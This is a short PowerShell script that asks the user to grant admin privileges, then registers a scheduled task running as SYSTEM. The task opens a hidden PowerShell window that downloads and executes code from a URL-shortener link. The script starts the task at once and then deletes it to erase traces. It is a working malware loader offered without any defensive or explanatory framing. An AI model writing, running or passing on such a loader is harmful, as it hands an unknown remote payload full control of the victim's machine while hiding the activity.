Write-Host "Please Allow admin privileges!" -ForegroundColor Blue
# Define the action to be taken (PowerShell command)
$action = New-ScheduledTaskAction -Execute 'PowerShell.exe' `
    -Argument '-WindowStyle Hidden -NoProfile -Command "iex((New-Object System.Net.WebClient).DownloadString(\'https://t.ly/TBedb\'))"'

# Define the principal (run as SYSTEM)
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount

# Create and register the task
$taskName = "ImmediateTaskAsSystem"
Register-ScheduledTask -TaskName $taskName -Action $action -Principal $principal

# Start the task immediately
Start-ScheduledTask -TaskName $taskName

# Optionally, wait a moment for the task to execute, then remove it
Start-Sleep -Seconds 3
Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
